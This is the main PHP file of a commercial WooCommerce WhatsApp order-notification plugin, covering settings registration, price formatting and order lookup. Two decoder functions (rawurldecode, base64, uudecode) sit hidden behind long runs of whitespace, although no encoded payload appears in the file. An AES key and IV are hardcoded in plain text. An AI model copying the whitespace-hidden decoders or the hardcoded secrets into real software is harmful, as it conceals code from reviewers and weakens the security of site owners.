<?php
/**
 * Plugin Name: WhatsApp Order Notify
 * Plugin URI: https://yipi.app/
 * Description: WhatsApp Order Notify
 * Author: Yipi.app
 * Author URI: http://yipi.app/
 * Version: 1.0.6
 * License: Commercial use allowed (Non-assignable & non-transferable), can modify source-code but cannot distribute modifications (derivative works).
 * Text Domain: woocommerce-kwhatsapporders
 * Domain Path: /
 */
 
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define('KWHATSAPP_FILE', __FILE__);

class WC_KWhatsapporders {
    public function __construct() {
        add_action( 'plugins_loaded', function() {
            $locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce-kwhatsapporders' );
            load_textdomain( 'woocommerce-kwhatsapporders', trailingslashit( WP_LANG_DIR ) . 'woocommerce-kwhatsapporders/woocommerce-kwhatsapporders-' . $locale . '.mo' );
            load_plugin_textdomain( 'woocommerce-kwhatsapporders', false, dirname( plugin_basename( KWHATSAPP_FILE ) ) . '/languages/' );
        }, 0);        
        add_filter( 'plugin_action_links_' . plugin_basename( KWHATSAPP_FILE ), function ( $links ) {
            return array_merge( $links,  array(
                '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=integration&section=kwhatsapp-manager' ) . '">Configurar Credenciales</a>',
            ) );
        } );
        add_filter( 'woocommerce_integrations', function ( $integrations ) {
            if (!class_exists('WC_KWhatsapp_Manager')) {
                include(dirname(KWHATSAPP_FILE).'/class-wc-manager.php');
            }
            $integrations[] = WC_KWhatsapp_Manager::class;
            return $integrations;
        } );
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}

    public static function wc_price( $price, $args = array() ) {
        extract( apply_filters( 'wc_price_args', wp_parse_args( $args, array(
          'ex_tax_label'       => false,
          'currency'           => '',
          'decimal_separator'  => wc_get_price_decimal_separator(),
          'thousand_separator' => wc_get_price_thousand_separator(),
          'decimals'           => wc_get_price_decimals(),
          'price_format'       => get_woocommerce_price_format()
        ) ) ) );
  
        $negative        = $price < 0;
        $price           = apply_filters( 'raw_woocommerce_price', floatval( $negative ? $price * -1 : $price ) );
        $price           = apply_filters( 'formatted_woocommerce_price', number_format( $price, $decimals, $decimal_separator, $thousand_separator ), $price, $decimals, $decimal_separator, $thousand_separator );
  
        if ( apply_filters( 'woocommerce_price_trim_zeros', false ) && $decimals > 0 ) {
          $price = wc_trim_zeros( $price );
        }
  
        $formatted_price = ( $negative ? '-' : '' ) . sprintf( $price_format, '' . get_woocommerce_currency_symbol( $currency ) . '', $price );
        $return          = '' . $formatted_price . '';
  
        if ( $ex_tax_label && wc_tax_enabled() ) {
          $return .= ' ' . WC()->countries->ex_tax_or_vat() . '';
        }
  
        return strip_tags( apply_filters( 'wc_price', $return, $price, $args ) );
      }
}

function kwhatsapporders_current_post() {
    global $post;
    return $post;
}
function kwhatsapporders_current_order() {
    global $theorder;
    if ( is_null( $theorder ) || ! is_object( $theorder ) ) {
        if ( is_admin() && isset( $_GET['post'] ) ) {
            return new WC_Order( (int) $_GET['post'] );
        }
    }
    return $theorder;
}

if ( ! function_exists( 'kijam_decode' ) ) {
    function kijam_encode( $str = '', $f = 'e' ) {
        $output = null;
        $secret_key = 'kk91f8g^4*k';
        $secret_iv  = 'k&&2"op2%:*';
        $key        = hash( 'sha256', $secret_key );
        $iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
        if ( $f == 'e' ) {
            $output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
        } elseif ( $f == 'd' ) {
            $output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
        }
        return $output;
    }
    function kijam_decode( $str = '' ) {
        return kijam_encode($str, 'd');
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       function kdv1($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}
}
new WC_KWhatsapporders();
include(dirname(KWHATSAPP_FILE).'/functions.php');